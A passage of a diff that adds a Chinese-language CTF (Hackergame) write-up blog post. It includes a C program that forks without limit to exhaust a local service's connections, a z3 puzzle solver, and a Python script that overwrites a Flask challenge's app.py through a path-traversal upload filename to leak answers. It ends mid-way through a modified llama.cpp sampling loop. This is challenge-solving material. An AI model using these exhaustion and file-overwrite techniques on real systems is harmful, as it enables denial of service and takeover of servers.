+#include &lt;arpa/inet.h&gt;
+
+#define TARGET_PORT 8000
+#define MAX_PROCESSES 100 
+
+int main() {
+    while(1) {
+        pid_t pid = fork();
+
+        if (pid &lt; 0) {
+            // fork 失败说明到 PID 上限了，保持主进程执行
+            sleep(100);
+        }
+
+        if (pid == 0) {
+            // 子进程
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock &lt; 0) continue;
+
+            struct sockaddr_in server_addr;
+            server_addr.sin_family = AF_INET;
+            server_addr.sin_port = htons(TARGET_PORT);
+            inet_aton("127.0.0.1", &amp;server_addr.sin_addr);
+
+            connect(sock, (struct sockaddr*)&amp;server_addr, sizeof(server_addr));
+
+            sleep(100);
+        }
+    }
+
+    return 0;
+}
+</code></pre> <h2 id="关灯">关灯</h2> <p>经典 <code class="language-plaintext highlighter-rouge">z3</code>, 前三个的 exp 都一样</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">z3</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">numpy</span>
+<span class="kn">from</span> <span class="n">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
+<span class="kn">from</span> <span class="n">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
+
+<span class="k">def</span> <span class="nf">convert_switch_array_to_lights_array</span><span class="p">(</span><span class="n">switch_array</span><span class="p">:</span> <span class="n">numpy</span><span class="p">.</span><span class="n">array</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">numpy</span><span class="p">.</span><span class="n">array</span><span class="p">:</span>
+    <span class="n">lights_array</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="nf">zeros_like</span><span class="p">(</span><span class="n">switch_array</span><span class="p">)</span>
+    <span class="n">lights_array</span> <span class="o">^=</span> <span class="n">switch_array</span>
+    <span class="n">lights_array</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">:,</span> <span class="p">:]</span> <span class="o">^=</span> <span class="n">switch_array</span><span class="p">[</span><span class="mi">1</span><span class="p">:,</span> <span class="p">:,</span> <span class="p">:]</span>
+    <span class="n">lights_array</span><span class="p">[</span><span class="mi">1</span><span class="p">:,</span> <span class="p">:,</span> <span class="p">:]</span> <span class="o">^=</span> <span class="n">switch_array</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">:,</span> <span class="p">:]</span>
+    <span class="n">lights_array</span><span class="p">[:,</span> <span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">:]</span> <span class="o">^=</span> <span class="n">switch_array</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">:,</span> <span class="p">:]</span>
+    <span class="n">lights_array</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">:,</span> <span class="p">:]</span> <span class="o">^=</span> <span class="n">switch_array</span><span class="p">[:,</span> <span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">:]</span>
+    <span class="n">lights_array</span><span class="p">[:,</span> <span class="p">:,</span> <span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">switch_array</span><span class="p">[:,</span> <span class="p">:,</span> <span class="mi">1</span><span class="p">:]</span>
+    <span class="n">lights_array</span><span class="p">[:,</span> <span class="p">:,</span> <span class="mi">1</span><span class="p">:]</span> <span class="o">^=</span> <span class="n">switch_array</span><span class="p">[:,</span> <span class="p">:,</span> <span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">lights_array</span>
+
+<span class="k">def</span> <span class="nf">generate_puzzle</span><span class="p">(</span><span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">numpy</span><span class="p">.</span><span class="n">array</span><span class="p">:</span>
+    <span class="n">random_bytes</span> <span class="o">=</span> <span class="nf">get_random_bytes</span><span class="p">((</span><span class="n">n</span><span class="o">**</span><span class="mi">3</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">switch_array</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="nf">unpackbits</span><span class="p">(</span><span class="n">numpy</span><span class="p">.</span><span class="nf">frombuffer</span><span class="p">(</span><span class="n">random_bytes</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="n">numpy</span><span class="p">.</span><span class="n">uint8</span><span class="p">))[:(</span><span class="n">n</span><span class="o">**</span><span class="mi">3</span><span class="p">)].</span><span class="nf">reshape</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+    <span class="n">lights_array</span> <span class="o">=</span> <span class="nf">convert_switch_array_to_lights_array</span><span class="p">(</span><span class="n">switch_array</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">lights_array</span>
+
+<span class="k">def</span> <span class="nf">solve_lights_out_3d</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">target_lights</span><span class="p">):</span>
+    <span class="n">switches</span> <span class="o">=</span> <span class="p">[[[</span><span class="nc">Bool</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">switch_</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
+    
+    <span class="n">solver</span> <span class="o">=</span> <span class="nc">Solver</span><span class="p">()</span>
+    
+    <span class="k">def</span> <span class="nf">lights_out</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>
+        <span class="n">toggle_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="p">]]</span>
+        <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">toggle_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="n">toggle_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">y</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">toggle_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">z</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="n">toggle_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="n">z</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">z</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">toggle_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="n">toggle_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">return</span> <span class="nc">Sum</span><span class="p">([</span><span class="nc">If</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">toggle_list</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="nf">int</span><span class="p">(</span><span class="n">target_lights</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="p">])</span>
+    
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+            <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+                <span class="n">solver</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nf">lights_out</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">))</span>
+    
+    <span class="k">if</span> <span class="n">solver</span><span class="p">.</span><span class="nf">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+        <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="p">.</span><span class="nf">model</span><span class="p">()</span>
+        <span class="n">solution</span> <span class="o">=</span> <span class="p">[[[</span><span class="n">model</span><span class="p">.</span><span class="nf">evaluate</span><span class="p">(</span><span class="n">switches</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="p">])</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
+        <span class="n">solution_string</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span> <span class="k">if</span> <span class="n">solution</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">][</span><span class="n">z</span><span class="p">]</span> <span class="k">else</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n</span><span class="p">)])</span>
+        <span class="k">return</span> <span class="n">solution_string</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">No solution found</span><span class="sh">"</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">11</span>
+<span class="n">lights_array</span> <span class="o">=</span> <span class="nf">generate_puzzle</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+<span class="n">solution</span> <span class="o">=</span> <span class="nf">solve_lights_out_3d</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">lights_array</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Solution:</span><span class="sh">"</span><span class="p">,</span> <span class="n">solution</span><span class="p">)</span>
+</code></pre></div></div> <h2 id="禁止内卷">禁止内卷</h2> <p>我做的比较暴力，开始是尝试 inference 出来（没注意到加了 sanity），失败了 <del>听说有人可以 inference 出来，挺厉害的</del></p> <p>因为题目里写了 <code class="language-plaintext highlighter-rouge">flask run --reload --host 0</code>，所以开始是尝试结合路径穿越漏洞上传一个新的 <code class="language-plaintext highlighter-rouge">secrets.py</code> 到运行目录下替换函数的，后来发现好像 <code class="language-plaintext highlighter-rouge">reload</code> 是不可以 <code class="language-plaintext highlighter-rouge">reload</code> 已经 import 的内容的遂失败（也可能是单纯的我搞错了），后面就直接路径穿越暴力覆盖 <code class="language-plaintext highlighter-rouge">app.py</code>，成功了</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://chal02-m8u2l3ak.hack-challenge.lug.ustc.edu.cn:8443</span><span class="sh">"</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/submit</span><span class="sh">"</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+
+<span class="n">boundary</span> <span class="o">=</span> <span class="sh">"</span><span class="s">-----------------------------330935380121946806301231286775</span><span class="sh">"</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Custom User Agent String</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br, zstd</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="n">host</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Sec-Fetch-Dest</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">document</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Sec-Fetch-Mode</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">navigate</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Sec-Fetch-Site</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">same-origin</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Sec-Fetch-User</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">?1</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">Priority</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">u=0, i</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">_ga</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">GA1.3.1136939081.1704010130</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">_ga_VR0TZSDVGE</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">GS1.3.1708930541.2.1.1708930610.0.0.0</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">sduuid</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">11d79c7db986c2237ea0e97aa1b8b201</span><span class="sh">"</span>
+<span class="p">}</span>
+
+<span class="n">json_content</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+from flask import Flask, render_template, request, flash, redirect
+import json
+import os
+import traceback
+import secrets
+app = Flask(__name__)
+app.secret_key = secrets.token_urlsafe(64)
+UPLOAD_DIR = </span><span class="sh">"</span><span class="s">/tmp/uploads</span><span class="sh">"</span><span class="s">
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+# results is a list
+try:
+    with open(</span><span class="sh">"</span><span class="s">results.json</span><span class="sh">"</span><span class="s">) as f:
+        results = json.load(f)
+except FileNotFoundError:
+    results = []
+    with open(</span><span class="sh">"</span><span class="s">results.json</span><span class="sh">"</span><span class="s">, </span><span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="s">) as f:
+        json.dump(results, f)
+def get_answer():
+    # scoring with answer
+    # I could change answers anytime so let</span><span class="sh">'</span><span class="s">s just load it every time
+    with open(</span><span class="sh">"</span><span class="s">answers.json</span><span class="sh">"</span><span class="s">) as f:
+        answers = json.load(f)
+        for idx, i in enumerate(answers):
+            exit(0)
+    return answers
+@app.route(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">, methods=[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="s">])
+def index():
+    res = render_template(</span><span class="sh">"</span><span class="s">index.html</span><span class="sh">"</span><span class="s">, results=sorted(results))
+    ans = open(</span><span class="sh">'</span><span class="s">answers.json</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="s">).read()
+    flash(ans)
+    return res
+@app.route(</span><span class="sh">"</span><span class="s">/submit</span><span class="sh">"</span><span class="s">, methods=[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">])
+def submit():
+    flash(</span><span class="sh">"</span><span class="s">Hacked</span><span class="sh">"</span><span class="s">)
+    ans = open(</span><span class="sh">'</span><span class="s">answers.json</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="s">).read()
+    flash(</span><span class="sh">"</span><span class="s">Hacked:</span><span class="sh">"</span><span class="s"> + ans)
+    return redirect(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">)
+    
+</span><span class="sh">'''</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">body</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
+    <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">file</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">/../../../../../../tmp/web/app.py</span><span class="se">\"\r\n</span><span class="sh">"</span>
+    <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Type: application/json</span><span class="se">\r\n\r\n</span><span class="sh">"</span>
+    <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">json_content</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
+    <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">--</span><span class="se">\r\n</span><span class="sh">"</span>
+<span class="p">)</span>
+
+<span class="n">content_length</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)))</span>
+<span class="n">headers</span><span class="p">[</span><span class="sh">"</span><span class="s">Content-Length</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">content_length</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div> <h2 id="神秘代码-2">神秘代码 2</h2> <p>只做出来了第一个，打开后发现后面有一串看上去像 base64 字母表的东西，尝试了下换表 base64 就出了</p> <h2 id="ai名字太长了不抄了">AI（名字太长了不抄了）</h2> <p>这下是老本行了（bushi，改了下 <code class="language-plaintext highlighter-rouge">llama_cpp/llama.py</code>，感觉没必要像官方解答那样 general，数理基础有些过于强大了（bushi，我选择直接手摇，其实用改过的 code 去手摇也就十分钟不到的事，直接调用 <code class="language-plaintext highlighter-rouge">generate</code> 这个 API 就可以，它已经做好了 KV Cache 之类的工作，还挺省时间的，最终在 H100 上一两分钟生成答案。</p> <p>主要思路就是扔掉概率 \(P &lt; 0.05\) 的 token(唯一的例外是那个 <code class="language-plaintext highlighter-rouge">dazzling</code> 手动 patch 掉就可以) ，剩下的就是手摇 ：）））））</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Llama</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">():</span>
+        <span class="bp">...</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">_generated_prompt</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">#</span><span class="sh">'''</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">_former_choices</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># 用来手摇的
+</span>        <span class="n">self</span><span class="p">.</span><span class="n">pattern_string_1</span> <span class="o">=</span> <span class="sh">'</span><span class="s">第一题的 after.txt</span><span class="sh">'</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">pattern_string_2</span> <span class="o">=</span> <span class="sh">'</span><span class="s">第二题的 after.txt</span><span class="sh">'</span>
+    
+    <span class="k">def</span> <span class="nf">regex_match</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+        <span class="c1"># print(text)
+</span>        <span class="n">pattern_string</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">pattern_string_2</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="sh">'</span><span class="s">^</span><span class="sh">'</span>
+        <span class="n">allowed_chars</span> <span class="o">=</span> <span class="sh">"</span><span class="s">hackergame of ustcx</span><span class="sh">"</span>
+        <span class="c1"># allowed_chars = "hackergamex"
+</span>        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">pattern_string</span><span class="p">[:</span><span class="nf">len</span><span class="p">(</span><span class="n">text</span><span class="p">)]:</span>
+            <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">:</span>
+                <span class="n">pattern</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">allowed_chars</span><span class="si">}</span><span class="s">]</span><span class="sh">"</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">pattern</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">pattern</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">$</span><span class="sh">'</span>
+        <span class="c1"># print(pattern, text)
+</span>        <span class="n">regex</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="n">pattern</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">,</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\(</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">)</span><span class="sh">'</span><span class="p">,</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\)</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\.</span><span class="sh">'</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">regex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span>   
+    
+    <span class="p">...</span> 
+
+    <span class="k">def</span> <span class="nf">generate</span><span class="p">(...):</span>
+        <span class="bp">...</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="n">tokens</span><span class="p">)</span>
+            <span class="k">while</span> <span class="n">sample_idx</span> <span class="o">&lt;</span> <span class="n">self</span><span class="p">.</span><span class="n">n_tokens</span><span class="p">:</span>
+                <span class="n">logits</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">_scores</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">n_tokens</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+                <span class="n">probs</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">exp</span><span class="p">(</span><span class="n">logits</span><span class="p">)</span> <span class="o">/</span> <span class="n">np</span><span class="p">.</span><span class="nf">sum</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="nf">exp</span><span class="p">(</span><span class="n">logits</span><span class="p">))</span>
+                <span class="n">top_indices</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">argsort</span><span class="p">(</span><span class="n">probs</span><span class="p">)[</span><span class="o">-</span><span class="n">top_k</span><span class="p">:][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+                <span class="n">top_tokens</span> <span class="o">=</span> <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="nf">detokenize</span><span class="p">([</span><span class="n">i</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">top_indices</span><span class="p">]</span>
+                <span class="n">top_probs</span> <span class="o">=</span> <span class="n">probs</span><span class="p">[</span><span class="n">top_indices</span><span class="p">]</span>
+                
+                <span class="n">choices</span> <span class="o">=</span> <span class="p">[]</span>
+                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">prob</span><span class="p">)</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="nf">zip</span><span class="p">(</span><span class="n">top_tokens</span><span class="p">,</span> <span class="n">top_probs</span><span class="p">)):</span>
+                    <span class="k">try</span><span class="p">:</span>
